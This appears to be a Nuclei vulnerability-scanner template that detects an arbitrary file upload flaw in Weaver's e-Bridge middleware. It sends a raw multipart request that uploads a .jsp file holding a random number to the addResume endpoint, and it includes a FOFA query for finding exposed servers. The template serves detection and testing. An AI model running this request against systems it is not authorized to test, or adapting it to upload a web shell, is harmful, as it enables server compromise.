id: weaver-ebridge-addResume-fileupload
info:
  name: 泛微云桥 e-Bridge
  author: leadlife
  severity: critical
  description: 泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。攻击者可通过任意文件上传漏洞上传文件，获取服务器权限。
  reference: 
    - https://blog.csdn.net/weixin_53009585/article/details/140947596
    - https://github.com/wy876/POC/blob/8c65f6317950b5e6862ad49c777b5d743fd18aae/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5(e-Bridge)%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3addResume%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="泛微-云桥e-Bridge"
  tags: weaver,ebridge,fileupload,oa

variables:
  num: '{{rand_int(800000000, 1000000000)}}'

http:
  - raw:
      - |
        POST /wxclient/app/recruit/resume/addResume?fileElementld=111 HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: EBRIDGE_JSESSIONID=6E01926E757A8B0BE87DAA2EACC80EF6
        Connection: keep-alive
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDOVhr5SwLI1wpry7
        Content-Length: 264

        ------WebKitFormBoundaryDOVhr5SwLI1wpry7
        Content-Disposition: form-data; name="file";filename="{{num}}.jsp"

        {{num}}
        ------WebKitFormBoundaryDOVhr5SwLI1wpry7--
        Content-Disposition: form-data; name="file";filename="{{num}}.jsp"

        {{num}}
        ------WebKitFormBoundaryDOVhr5SwLI1wpry7--
      

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'status','success','msg','提交成功')
        condition: and

